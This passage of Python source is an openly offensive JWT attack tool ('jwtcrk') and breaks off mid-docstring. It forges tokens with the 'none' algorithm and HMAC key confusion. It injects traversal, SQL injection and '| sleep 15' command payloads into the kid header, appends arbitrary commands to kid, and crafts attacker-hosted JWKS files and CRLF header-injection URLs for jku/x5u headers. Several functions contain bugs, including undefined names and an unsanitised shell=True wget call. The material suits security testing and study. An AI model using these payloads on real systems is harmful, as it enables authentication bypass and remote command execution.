#!/usr/local/bin/python3.8

"""
    A tool to test the security of JWTs.
    Copyright (C) 2021  Andea Tedeschi  andreatedeschi95@gmail.com  DontPanicO

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""


__version__ = "0.1"
__author__ = "DontPanicO"

import os
import sys
import subprocess
import hmac
import hashlib
import base64
import json
import re
import binascii
import argparse
import urllib.parse

import OpenSSL
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

try:
    from config import cwd
except ImportError:
    path = os.path.abspath(sys.argv[0])
    cwd = "/".join(path.split("/")[:-1]) + "/"


class Bcolors:
    """
    A class used to store colors in some constant, to be retrieved later in the script to return a fancy output.

    """
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class Cracker:

    description = "A command line tool for test security of JWTs"

    usage = """
        python3 jwt-crack.py <token> [OPTIONS]; OR
        jwtcrk <token> [OPTIONS]; IF YOU HAVE USED install.py
	"""

    man = """
        python3 jwt-crack.py <token> [options]; OR
        jwtcrk <token> [options]; IF YOU HAVE USED install.py

        Positional:
        token                      [Your JWT.]

        Optional:
        -a --alg <alg>             [The algorithm; None, none, HS256, RS256.]
        -k --key <path>            [The path to the key if it's needed.]
        -p --payload <key:value>   [The claim you want to change in the payload. key:value]
           --remove-from <sec:key> [A key to remove from a section (header or payload) of
                                    the token.]
           --add-into <sec:key>    [Same as --remove-from but add. This is needed since for some
                                    attack, like jku/x5u related ones, the tool won't automatically
                                    insert new headers in the token. Use this option to force the
                                    tool to add the header. The tool will assign a default value to
                                    the new header, so you should run an attack that will process
                                    that header.]
        -d --decode                [Decode the token and quit.]
           --complex-payload <key,key...>:<value,...>
                                   [An options to change payload subclaims. If you can access a claim
                                    with one key, use --payload. Else, if you need to go deeper in
                                    the payload object, use this options passing the keys and the
                                    values as a key:value pair. The keys must be separated by ',',
                                    while the value will usually be only one. If you want to inject
                                    a list of values, separates also them with commas.]
           --unverified            [Act as the host does not verify the signature.]
           --auto-try <hostname>   [Retrieve the key from the host ssl certs.]
           --specify-key <string>  [A string used as key.]
           --inject-kid <exploit>  [Try to inject a payload in the kid header; dirtrv, sqli or rce.]
           --kid-curl-info <ip:port>
                                   [If you select rce payload in --inject-kid, the script will
                                    insert a curl payload in the kid header. With this option you
                                    tell the script the ip/domain and the port to wich make a curl
                                    request.]
           --exec-via-kid <cmd>    [Default rce payload provided by --inject kid may not work.
                                    In such cases you should use --exec-via-kid and write the command
                                    to append in the kid header. Remember to enquote the command if
                                    it contains spaces.]
           --jku-basic <yourURL>   [Basic jku injection. The tool will return a jwks file that you have
                                    to host on a server you own. Except for cases where you passed the
                                    --manual option, the tool will append '/.well-known/jwks.json' to
                                    the url specified, so be sure to place the file on you server under
                                    this path. Do not submit the token before the file is reachable on
                                    your server.]
           --jku-redirect <mainURL,yourURl>
                                   [Try to use an open redirect to make the jku header pointing to
                                    your url. To do this you need to specify the exact place in
                                    the main url, where your url has to be placed. This is done
                                    with the HERE keyword. Look at the examples for more details.
                                    '/.well-known/jwks.json' will be appended to your url.]
           --jku-inbody <mainURL>  [Try to exploit an http header injection to inject the jwks in
                                    the http response of the url. Use the HERE keyword to let the
                                    tool know where to inject the jwks. The tool won't return any
                                    file since jwks will be injected in the response body.
                                    '/.well-known/jwks.json' will be appended to you url.]
           --x5u-basic <yourURL>   [Same as --jku-basic but with x5u header. The x5u allow to link
                                    an url to a jwks file containing a certificate. The tool will
                                    generate a certificate an will craft a proper jwks file.]
           --x5u-inbody <mainURL>  [Same as --jku-inbody but with x5u header.]
           --manual                [This bool flag allow you to manually craft an url for the jku
                                    or x5u header, if used with --jku-basic or --x5u-basic.
                                    This is needed since in some situations, automatic options
                                    could be a limit. So if you need to define different urls, use
                                    this option, and to the url you specified in --jku-basic or
                                    --x5u-basic, the tool won't append anything. This option is not
                                    compatible with other jku/x5u options.]
           --generate-jwk          [Generate a jwk claim and insert it in the token header.]

        Examples:
        jwtcrk <token> --decode
        jwtcrk <token> --alg None --payload <key>:<value>
        jwtcrk <token> --alg HS256 --key <path_to_public.pem> --payload <key>:<value>
        jwtcrk <token> --alg hs256 --complex-payload <key1,key,2key3>:<value> --unverified
        jwtcrk <token> --alg RS256 --payload <key>:<value> --jku-basic http://myurl.com
        jwtcrk <token> --alg rs256 -p <key>:<value> --jku-redirect https://example.com?redirect=HERE&foo=bar,https://myurl.com
        jwtcrk <token> --alg rs256 -p <key>:<vaue> --add-into header:x5u --x5u-basic http://myurl.com

        Documentation: http://andreatedeschi.uno/jwtCracker/docs/
        """

    command = ["jwtcrk"] + [sys.argv[i] for i in range(1, len(sys.argv))]

    output = f"""{Bcolors.OKBLUE}A tool to exploit JWT vulnerabilities...{Bcolors.ENDC}
{Bcolors.HEADER}Version:{Bcolors.ENDC} {Bcolors.OKCYAN}{__version__}{Bcolors.ENDC}
{Bcolors.HEADER}Author:{Bcolors.ENDC} {Bcolors.OKCYAN}{__author__}{Bcolors.ENDC}
{Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
        """

    def __init__(self, token, alg, path_to_key, user_payload, complex_payload, remove_from, add_into, auto_try, kid, exec_via_kid,
                 specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, unverified=False, decode=False,
                 manual=False, generate_jwk=False):
        """
        :param token: The user input token -> str.
        :param alg: The algorithm for the attack. HS256 or None -> str.
        :param path_to_key: The path to the public.pem, if the alg is HS256 -> str.
        :param user_payload: What the user want to change in the payload -> list.
        :param complex_payload: A string (key:value) containing key separated by , to access subclaims -> str
        :param remove_from: What the user want to delete in the header or in the payload -> list.
        :param add_into: What the user want to add in the header (useless in the payload) -> list.
        :param auto_try: The hostname from which the script try to retrieve a key via openssl -> str.
        :param kid: The type of payload to inject in the kid header. DirTrv, SQLi or RCE -> str.
        :param exec_via_kid: A command to append in the kid header -> str.
        :param specified_key: A string set to be used as key -> str.
        :param jku_basic: The main url on which the user want to host the malformed jwks file -> str.
        :param jku_redirect: Comma separated server url and the user one -> str.
        :param jku_header_injection: The server url vulnerable to HTTP header injection -> str
        :param x5u_basic: The main url on which the user want to host the malformed jwks file -> str.
        :param x5u_header_injection: The server url vulnerable to HTTP header injection -> str.
        :param unverified: A flag to set if the script have to act as the host doesn't verify the signature -> Bool.
        :param decode: A flag to set if the user need only to decode the token -> Bool.
        :param manual: A flag to set if the user need to craft an url manually -> Bool.
        :param generate_jwk: A flag, if present a jwk will be generated and inserted in the token header -> Bool.

        Initialize the variables that we need to be able to access from all the class; all the params plus
        self.file and self.token. Then it call the validation method to validate some of these variables (see below),
        and lastly create a token dictionary, with dictionarize_token, and get decoded header and payload out of it.

        """
        print(Cracker.output)
        self.token = token
        self.alg = alg
        self.path_to_key = path_to_key
        """self.file and self.key will be overriden later"""
        self.file = None
        self.key = None
        self.user_payload = user_payload
        self.complex_payload = complex_payload
        self.remove_from = remove_from
        self.add_into = add_into
        self.auto_try = auto_try
        self.kid = kid
        self.exec_via_kid = exec_via_kid
        self.specified_key = specified_key
        self.jku_basic = jku_basic
        self.jku_redirect = jku_redirect
        self.jku_header_injection = jku_header_injection
        self.x5u_basic = x5u_basic
        self.x5u_header_injection = x5u_header_injection
        self.unverified = unverified
        self.decode = decode
        self.manual = manual
        self.generate_jwk = generate_jwk
        """Groups args based on requirements"""
        self.jwks_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection, self.x5u_basic, self.x5u_header_injection, self.generate_jwk]
        self.require_alg_args = [self.path_to_key, self.auto_try, self.kid, self.specified_key] + self.jwks_args
        """Store a command that need to run in case of x5u injection and open devnull"""
        self.x5u_command = 'openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out testing.crt -subj "/C=US/State=Ohio/L=Columbus/O=TestingInc/CN=testing"'
        self.devnull = open(os.devnull, 'wb')
        """Call the validation"""
        self.validation()
        self.token_dict = Cracker.dictionarize_token(token)
        self.original_token_header, self.original_token_payload = Cracker.decode_encoded_token(self.token_dict)

    def validation(self):
        """
        Does some validation on; self.token, self.alg, and all key related arguments.
        This function is written in a terrible way, but it works. Since it has to handle so many different use cases
        for now it's enough. If you want to make some restyle, without compromising its functionality, you're welcome.

        1)Validate the token: Using check_token, looks if the token is valid. If not quits out.

        2)Validate alg: If an algorithm has been passed, it checks that's a valid one. If it's None or none it reminds
        to the user that some libraries accept None and other none. Then does a case sensitive correction if hs256 or rs256
        has been passed as alg. Last but not least, if any jku/x5u argument is present, it force the alg to be RSA.
        Since the user can not passes more than one jku/x5u related argument, the script look for that and eventually quits.

        3)Validate key: This is the most complex validation since the key can be retrieved from different arguments.
        This validation has to solve lot of possible conflicts, at least giving warnings to the user and giving priority
        to the right argument. First, if a jku/x5u argument has been passed, the scripts checks that no other key related one
        has been passed too, and if it quits out. Else it generates a priv pub pair with openssl, or read from a file in case
        of x5u and extracs the modulus and the esponent. Since now, if any jku/x5u arg has been passed, we know that not other
        args has, so the validation ends here.
        If it goes on, it means that we have no jku/x5u arg, so we don't need to check for it later in the function.
        If an hostname for self.auto_try has been passed, it call get_key_from_ssl_cert and stores it in self.path_to_key.
        In this check, if we have self.kid, self.specified or self.path_to_key the script quits, cause of the conflict(self.kid
        uses preset keys). Then it validate self.kid: if self.path_to_key or self.specified has been passed, returns an error
        and quits. Else goes on and checks that self.kid has a proper value. Then if self.specified has been passed, checks that
        self.path_to_key has not (at this point we know that other args has not been passed since we have already validated
        them), and store self.specified value in self.key. Last, if we have self.path_to_key, checks that the path exists and that
        the algorithm has a proper value. Then read the file and store it in self.key.

        """
        """Validate the token"""
        token_is_valid = Cracker.check_token(self.token)
        if not token_is_valid:
            print("jwtcrk: err: Invalid token!")
            sys.exit(2)
        """Validate alg"""
        if self.alg is not None:
            valid_algs = ["None", "none", "HS256", "hs256", "RS256", "rs256"]
            if self.alg not in valid_algs:
                print(f"{Bcolors.FAIL}jwtcrk: err: Invalid algorithm{Bcolors.ENDC}")
                sys.exit(2)
            else:
                if self.alg == "hs256":
                    self.alg = "HS256"
                elif self.alg == "None" or self.alg == "none":
                    if any(self.require_alg_args):
                        print(f"{Bcolors.FAIL}jwtcrk: err: You don't need a key with None/none algorithm{Bcolors.ENDC}")
                        sys.exit(1)
                    print(f"{Bcolors.OKBLUE}INFO: Some JWT libraries use 'none' instead of 'None', make sure to try both.{Bcolors.ENDC}")
                elif self.alg == "rs256" or self.alg == "RS256":
                    if not any(arg is not None for arg in self.jwks_args):
                        print(f"{Bcolors.FAIL}jwtcrk: err: RS256 is supported only for jku injection for now{Bcolors.ENDC}")
                        sys.exit(1)
                    if self.alg == "rs256":
                        self.alg = "RS256"
        """Force self.alg to RS256 for jku attacks"""
        if any(arg and arg is not None for arg in self.jwks_args):
            if len(list(filter(lambda x: x is not None, self.jwks_args))) > 1:
                print(f"{Bcolors.FAIL}jwtcrk: err: You can't use two jku or x5u injections at the same time{Bcolors.ENDC}")
                sys.exit(1)
            if self.alg is not None and self.alg != "RS256":
                print(f"{Bcolors.WARNING}jwtcrk: warn: With jku/x5u injections, alg will be forced to RS256{Bcolors.ENDC}")
            self.alg = "RS256"
        """--manual can be used only with jku-basic or x5u-basic"""
        if self.manual:
            if not self.jku_basic and not self.x5u_basic:
                print(f"{Bcolors.FAIL}jwtcrk: err: You can use --manual only with jku/x5u basic injections{Bcolors.ENDC}")
                sys.exit(1)
        """Validate key"""
        if any(arg and arg is not None for arg in self.jwks_args):
            other_key_related_args = [self.path_to_key, self.auto_try, self.kid, self.exec_via_kid, self.specified_key]
            """With jku, you can't use other key related args"""
            if any(arg is not None for arg in other_key_related_args) or self.unverified:
                print(f"{Bcolors.FAIL}jwtcrk: err: You can't pass any key related arg with jku attacks{Bcolors.ENDC}")
                sys.exit(2)
            if not self.x5u_basic and not self.x5u_header_injection:
                """No x5u related argument has been passed"""
                """Generate a key with OpenSSL"""
                key = OpenSSL.crypto.PKey()
                key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)
                self.key = key
            else:
                """An x5u related argument has been passed"""
                subprocess.run(self.x5u_command, shell=True, stdin=self.devnull, stderr=self.devnull, stdout=self.devnull)
                """Read the key from private.pem"""
                key_file = open("key.pem", 'r')
                key_read = key_file.read()
                key_file.close()
                key = OpenSSL.crypto.load_privatekey(OpenSSL.crypto.FILETYPE_PEM, key_read)
                self.key = key
            """The key is converted in a cryptography.hazmat.backends.openssl.rsa._RSAPrivateKey object"""
            self.key.priv = key.to_cryptography_key()
            """Same but _RSAPublicKey object"""
            self.key.pub = self.key.priv.public_key()
            """Extract modulus and exponent"""
            self.key.pub.e = self.key.pub.public_numbers().e
            self.key.pub.n = self.key.pub.public_numbers().n
        if self.auto_try is not None:
            other_key_related_args = [self.path_to_key, self.kid, self.exec_via_kid, self.specified_key]
            if any(arg is not None for arg in other_key_related_arg) or self.unverififed:
                print(f"{Bcolors.FAIL}jwtcrk: err: --auto-try retrieves the key from ssl certs. Do not pass any other key related arg{Bcolors.ENDC}")
                sys.exit(2)
            if self.exec_via_kid is not None:
                print(f"{Bcolors.FAIL}jwtcrk: err: Code execution via kid needs no key. --autotry can't be ignored{Bcolors.ENDC}")
            path = Cracker.get_key_from_ssl_cert(self.auto_try)
            self.path_to_key = path
        elif self.kid is not None:
            if self.exec_via_kid is not None:
                print(f"{Bcolors.FAIL}jwtcrk: err: You can't run two different kid injections at once{Bcolors.ENDC}")
                sys.exit(2)
            if self.path_to_key is not None or self.specified_key is not None or self.unverified:
                print(f"{Bcolors.FAIL}jwtcrk: err: You don't need to specify a key for kid injections{Bcolors.ENDC}")
                sys.exit(2)
            else:
                if self.kid.lower() == "dirtrv":
                    self.kid = "DirTrv"
                    self.key = ""
                elif self.kid.lower() == "sqli":
                    self.kid = "SQLi"
                    self.key = "zzz"
                elif self.kid.lower() == "rce":
                    self.kid = "RCE"
                    """Command will be executed before the server validates the signature"""
                    self.key = "itdoesnotmatter"
                else:
                    print(f"{Bcolors.FAIL}jwtcrk: err: Invalid --inject-kid. Please select a valid one{Bcolors.ENDC}")
                    sys.exit(2)
        elif self.exec_via_kid is not None:
            if self.path_to_key is not None or self.specified_key is not None:
                print(f"{Bcolors.WARNING}jwtcrk: warn: Code execution via kid requires no key, your one will be ignored{Bcolors.ENDC}")
            self.key = "itdoesnotmatter"
        elif self.specified_key is not None:
            if self.path_to_key is not None:
                print(f"{Bcolors.FAIL}jwtcrk: err: You have passed two keys with --specify and --key{Bcolors.ENDC}")
                sys.exit(2)
            self.key = self.specified_key
        if self.path_to_key is not None:
            if not os.path.exists(self.path_to_key):
                print(f"{Bcolors.FAIL}jwtcrk: err: Seems like the file does not exist{Bcolors.ENDC}")
                sys.exit(2)
            else:
                self.file = open(self.path_to_key, 'r')
                self.key = self.file.read()

    def decode_and_quit(self):
        """
        The JWT "decoding" function.

        Since the decoded header and payload have already been stored when the __init__ method ran, it just displays
        them on the screen.
        This function is intended to run if -d (or --decode) is present so it prints outs some warnings if useless
        parameters have been called along with -d itself.

        """
        other_args = [
                      self.alg, self.path_to_key, self.user_payload, self.complex_payload,
                      self.auto_try, self.kid, self.specified_key,
                      self.jku_basic, self.jku_redirect, self.jku_header_injection,
                      self.remove_from, self.x5u_basic, self.x5u_header_injection,
                      self.add_into, self.exec_via_kid,
        ]
        if any(arg is not None for arg in other_args) or self.unverified or self.manual or self.generate_jwk:
            print(f"{Bcolors.WARNING}jwtcrk: warn: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}")
        print(f"{Bcolors.HEADER}Header:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_header}{Bcolors.ENDC}" +
              "\n" +
              f"{Bcolors.HEADER}Payload:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_payload}{Bcolors.ENDC}"
              )
        sys.exit(0)

    def modify_header_and_payload(self):
        """
        Starting from the originals decoded header and payload, modify them according to the user input.

        Using json, the function create two dictionaries of self.original_token_header and self.original_token_payload,
        in order to access and modify them as dict object. If add_into is present, the function validates it and add the
        specified key/s in the specified dictionary. If we have some header injection like kid or jku, the script modifys
        those headers with the related payload.
        It changes the algorithm to the one specified by the user, then look he has also declared any payload change.
        If he has, the function calls the change_payload method, for each change stored in self.user_payload.
        If self.remove_from has been passed, it removes the speicifed key/s from the corresponding dictionary.

        N.B. self.user_payload is a list and, any time the user call a -p, the value went stored in another list inside
        self.user_payload. So it basically contains as many list as the user calls to --payload. And the value of each
        calls will always be the firs and only element of each list. This is also valid for self.add_into and self.remove_from.

        :return: The modified header and payload strings.
        """
        header_dict = json.loads(self.original_token_header)
        payload_dict = json.loads(self.original_token_payload)
        header_dict['alg'] = self.alg
        if self.add_into:
            for item in self.add_into:
                try:
                    to_dict = item[0].split(":")[0]
                    to_add = item[0].split(":")[1]
                except IndexError:
                    print(f"{Bcolors.FAIL}jwtcrk: err: --add-into must have key:value syntax, where key is header or payload{Bcolors.ENDC}")
                    sys.exit(2)
                if to_dict != "header" and to_dict != "payload":
                    print(f"{Bcolors.FAIL}jwtcrk: err: You can delete keys only from header and payload{Bcolors.ENDC}")
                    sys.exit(2)
                if to_dict == "header":
                    header_dict = Cracker.add_key(header_dict, to_add)
                elif to_dict == "payload":
                    print(f"{Bcolors.WARNING}jwtcrk: warn: Adding key to payload is useless since you can do it directly via --payload{Bcolors.ENDC}")
                    payload_dict = Cracker.add_key(payload_dict, to_add)
        if self.kid:
            if "kid" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no kid{Bcolors.ENDC}")
                sys.exit(2)
            header_dict['kid'] += Cracker.inject_kid(self.kid)
        elif self.exec_via_kid:
            if "kid" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no kid{Bcolors.ENDC}")
                sys.exit(2)
            header_dict['kid'] += "|" + self.exec_via_kid
        elif self.jku_basic:
            if "jku" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no jku{Bcolors.ENDC}")
                sys.exit(2)
            if self.manual:
                url = self.jku_basic
            else:
                if self.jku_basic.endswith("jwks.json"):
                    print(f"{Bcolors.FAIL}jwtcrk: err: '/.well-known/jwks.json' will automatically be appended to you url. If you need to specify the complete url use --manual{Bcolors.ENDC}")
                    sys.exit(2)
                url = self.jku_basic.rstrip("/") + "/.well-known/jwks.json"
            self.jku_basic_attack(header_dict)
            header_dict['jku'] = url
        elif self.jku_redirect:
            if "jku" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no jku{Bcolors.ENDC}")
                sys.exit(2)
            if "HERE" not in self.jku_redirect:
                print(f"{Bcolors.FAIL}jwtcrk: err: You have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}")
                sys.exit(2)
            if "," not in self.jku_redirect:
                print(f"{Bcolors.FAIL}jwtcrk: err: Missing url. Please pass the vulnerable url and your one as comma separated values{Bcolors.ENDC}")
                sys.exit(2)
            if self.jku_redirect.endswith("jwks.json"):
                print(f"{Bcolors.FAIL}jwtcrk: err: '/.well-known/jwks.json' will automatically be appended to your url. To craft an url by yourself, use --jku-basic with the --manual option{Bcolors.ENDC}")
                sys.exit(2)
            main_url = self.jku_redirect.split(",")[0]
            your_url = self.jku_redirect.split(",")[1].rstrip("/") + "/.well-known/jwks.json"
            self.jku_basic_attack(header_dict)
            header_dict['jku'] = main_url.replace("HERE", your_url)
        elif self.jku_header_injection:
            if "jku" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no jku{Bcolors.ENDC}")
                sys.exit(2)
            if "HERE" not in self.jku_header_injection:
                print(f"{Bcolors.FAIL}jwtcrk: err: You have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}")
                sys.exit(2)
            if "," not in self.jku_header_injection:
                print(f"{Bcolors.FAIL}jwtcrk: err: Missing url. Please pass the vulnerable url and yur one as comma separated values{Bcolors.ENDC}")
                sys.exit(2)
            body = self.jku_via_header_injection(header_dict)
            content_length = len(body)
            body = Cracker.url_escape(body, "[]{}")
            injection = f"%0d%0aContent-Length:+{content_length}%0d%0a%0d%0a{body}"
            url = self.jku_header_injection.replace("HERE", injection)
            header_dict['jku'] = url
        elif self.x5u_basic:
            if "x5u" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no x5u{Bcolors.ENDC}")
                sys.exit(2)
            if self.manual:
                url = self.x5u_basic
            else:
                if self.x5u_basic.endswith("jwks.json"):
                    print(f"{Bcolors.FAIL}jwtcrk: err: '/.well-known/jwks.json' will automatically be appended to your url. If you need to specify the complete url please use --manual{Bcolors.ENDC}")
                    sys.exit(2)
                url = self.x5u_basic.rstrip("/") + "/.well-known/jwks.json"
            self.x5u_basic_attack(header_dict)
            header_dict['x5u'] = url
        elif self.x5u_header_injection:
            if "x5u" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtcrk: err: JWT has no x5u header{Bcolors.ENDC}")
                sys.exit(2)
            if "HERE" not in self.x5u_header_injection:
                print(f"{Bcolors.FAIL}jwtcrk: err: You have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}")
                sys.exit(2)
            if "," not in self.x5u_header_injection:
                print(f"{Bcolors.FAIL}jwtcrk: err: Missing url. Please pass the vulnerable url and your one as comma separated values{Bcolors.ENDC}")
                sys.exit(2)
            body = self.x5u_via_header_injection(header_dict)
            content_length = len(body)
            body = Cracker.url_escape(body, "[]{}")
            injection = f"%0d%0aContent-Length:+{content_length}%0d%0a%0d%0a{body}"
            url = self.x5u_header_injection.replace("HERE", injection)
            header_dict['x5u'] = url
        elif self.generate_jwk:
            crafted_jwk = Cracker.generate_jwk(self.n, self.e, "identifier")
            header_dict['jwk'] = crafted_jwk
        if self.user_payload:
            for item in self.user_payload:
                payload_dict = Cracker.change_payload(item[0], payload_dict)
        if self.complex_payload:
            for item in self.complex_payload:
                payload_dict = Cracker.change_payload_complex(item[0], payload_dict)
        if self.remove_from:
            for item in self.remove_from:
                try:
                    from_dict = item[0].split(":")[0]
                    to_del = item[0].split(":")[1]
                except IndexError:
                    print(f"{Bcolors.FAIL}jwtcrk: err: --remove-from must have key:value syntax, where key is header or payload{Bcolors.ENDC}")
                    sys.exit(2)
                if from_dict != "header" and from_dict != "payload":
                    print(f"{Bcolors.FAIL}jwtcrk: err: You can delete keys only from header or payload{Bcolors.ENDC}")
                    sys.exit(2)
                if from_dict == "header" and to_del == "alg" or from_dict == "header" and to_del == "typ":
                    print(f"{Bcolors.FAIL}jwtcrk: err: Deleting key {to_del} will invalidate the token{Bcolors.ENDC}")
                    sys.exit(1)
                if from_dict == "header":
                    header_dict = Cracker.delete_key(header_dict, to_del)
                elif from_dict == "payload":
                    payload_dict = Cracker.delete_key(payload_dict, to_del)
        new_header = json.dumps(header_dict, separators=(",", ":"))
        new_payload = json.dumps(payload_dict, separators=(",", ":"))
        return new_header, new_payload

    def jku_basic_attack(self, header):
        """
        :param header: The header dictionary -> dict.

        Gets the jwks.json file from the url specified in the jku header. Then loads the file as json in order to
        accesses it to change the modulus and the esponent with the ones of our generated key. Then creates a new
        file named jwks.json in the crafted/ directory and writes the dump of the jwks dict into it.
        """
        command = "wget " + header['jku']
        try:
            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
        except subprocess.CalledProcessError:
            print(f"{Bcolors.FAIL}Can't download jwks file from url specified in jku header{Bcolors.ENDC}")
            sys.exit(1)
        for file in os.listdir():
            if file.endswith(".json"):
                filename = file
                break
        else:
            filename = header['jku'].split("/")[-1] if header['jku'].split("/")[-1].endswith(".json") else header['jku'].split("/")[-2]
        jwks_original_file = open(filename)
        jwks_dict = json.load(jwks_original_file)
        jwks_dict['keys'][0]['e'] = base64.urlsafe_b64encode(
            (self.key.pub.e).to_bytes((self.key.pub.e).bit_length() // 8 + 1, byteorder='big')
        ).decode('utf-8').rstrip("=")
        jwks_dict['keys'][0]['n'] = base64.urlsafe_b64encode(
            (self.key.pub.n).to_bytes((self.key.pub.n).bit_length() // 8 + 1, byteorder='big')
        ).decode('utf-8').rstrip("=")
        file = open(f"{cwd}crafted/jwks.json", 'w')
        file.write(json.dumps(jwks_dict))
        file.close()
        os.remove(filename)

    def jku_via_header_injection(self, header):
        """
        :param header: The header dictonary -> dict.
        Same as self.jku_basic_attack, but instead of write a jwks file, returns the content in an HTTP response body
        format.

        :return: The crafted jwks string in an HTTP response body format.
        """
        command = "wget " + header['jku']
        try:
            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
        except subprocess.CalledProcessError:
            print(f"{Bcolors.FAIL}Can't download jwks file from url specified in jku header{Bcolors.ENDC}")
            sys.exit(1)
        for file in os.listdir():
            if file.endswith(".json"):
                filename = file
                break
        else:
            filename = header['jku'].split("/")[-1] if header['jku'].split("/")[-1].endswith(".json") else header['jku'].split("/")[-2]
        jwks_original_file = open(filename)
        jwks_dict = json.load(jwks_original_file)
        jwks_dict['keys'][0]['e'] = base64.urlsafe_b64encode(
            (self.key.pub.e).to_bytes((self.key.pub.e).bit_length() // 8 + 1, byteorder='big')
        ).decode('utf-8').rstrip("=")
        jwks_dict['keys'][0]['n'] = base64.urlsafe_b64encode(
            (self.key.pub.n).to_bytes((self.key.pub.n).bit_length() // 8 + 1, byteorder='big')
        ).decode('utf-8').rstrip("=")
        body = json.dumps(jwks_dict)
        os.remove(filename)
        return body

    def x5u_basic_attack(self, header):
        """
        :param header: The header dictonary -> dict

        Gets the jwks.json file from the url specified in the x5u header. Then loads the file as json in order to
        access it and changes the x5c (the X509 cert) with our generated one. Then creates a file named jwks.json
        under the crafted/ directory and write the dump of the jwks dict into it.
        """
        command = "wget " + header['x5u']
        try:
            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
        except subprocess.CalledProcessError:
            print(f"{Bcolors.FAIL}Can't download jwks file from url specified in x5u header{Bcolors.ENDC}")
            sys.exit(1)
        # Retrieve the right filename    TODO: Implement it in a better way
        for file in os.listdir():
            if file.endswith(".json"):
                filename = file
                break
        else:
            filename = header['x5u'].split("/")[-1] if header['x5u'].split("/")[-1].endswith(".json") else header['x5u'].split("/")[-2]
        with open("testing.crt", 'r') as cert_file:
            x5c_ = "".join([line.strip() for line in cert_file if not line.startswith('---')])
        jwks_original_file = open(filename)
        jwks_dict = json.load(jwks_original_file)
        jwks_dict['keys'][0]['x5c'] = x5c_
        file = open("{cwd}crafted/jwks.json", 'w')
        file.write(json.dumps(jwks_dict))
        file.close()
        os.remove(filename)

    def x5u_via_header_injection(self, header):
        """
        :param header: The header dictonary -> dict

        Same as self.x5u_basic attack, but instead of write the jwks file, returns its content in an HTTP response
        body format.

        :return: The crafted jwks string in an HTTP response body format.
        """
        command = "wget " + header['x5u']
        try:
            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
        except subprocess.CalledProcessError:
            print(f"{Bcolors.FAIL}Can't download the jwks file from the url specified in x5u header{Bcolors.ENDC}")
        for file in os.listdir():
            if file.endswith(".json"):
                filename = file
                break
        else:
            filename = header['x5u'].split("/")[-1] if header['x5u'].split("/")[-1].endswith(".json") else header['x5u'].split("/")[-2]
        with open("testing.crt", 'r') as cert_file:
            x5c_ = "".join([line.strip() for line in cert_file if not line.startswith('---')])
        jwks_original_file = open(filename)
        jwks_dict = json.load(jwks_original_file)
        jwks_dict['keys'][0]['x5c'] = x5c_
        body = json.dumps(jwks_dict)
        os.remove(filename)
        return body

    def select_signature(self, partial_token):
        """
        Creates a signature for the new token.

        :param partial_token: The first two part of the crafted jwt -> str.

        If self.unverified is present its define the signature as the one of the original token.
        Else, it checks which algorithm has been chosen by the user; with 'None' algorithm it stores an empty string
        as signature, while with HS256 it encrypts the partial_token with the key (self.keys) and, of course, using
        sha256. It encodes it in base64, and strips all trailing '='. With RSA it use self.key.priv to sign the token,
        using sha256 as algorithm and PKCS1v15 as padding. It encodes it in base64 and strips all trailing '='.

        :return: The generated signature.
        """
        if self.unverified:
            signature = self.token_dict['signature']
        else:
            if self.alg == "None" or self.alg == "none":
                signature = ""
            elif self.alg == "HS256":
                if self.key is None:
                    print(f"{Bcolors.FAIL}jwtcrk: err: Key is needed with HS256{Bcolors.ENDC}")
                    sys.exit(2)
                signature = base64.urlsafe_b64encode(
                    hmac.new(bytes(self.key, "utf-8"), partial_token.encode('utf-8'), hashlib.sha256).digest()
                ).decode('utf-8').rstrip("=")
            elif self.alg == "RS256":
                signature = base64.urlsafe_b64encode(
                    self.key.priv.sign(
                        bytes(partial_token, encoding='utf-8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15()
                    )
                ).decode('utf-8').rstrip("=")
        return signature

    @staticmethod
    def inject_kid(payload):
        """
        A function to test for injections in the kid header.

        :param payload: The payload to select -> str

        Defines a dictionary containing payloads to inject in the key header, and grabs the ones select by the user.
        This function is intended to be updated with new payloads.

        :return: The related payload string

        """
        kid_payloads = {
            "DirTrv": "../../../../../dev/null",
            "SQLi": "' union select 'zzz",
            "RCE": f"| sleep 15",
        }

        return kid_payloads[payload]

    @staticmethod
    def check_token(token):
        """
        A method for verify if a JWT have a valid pattern.

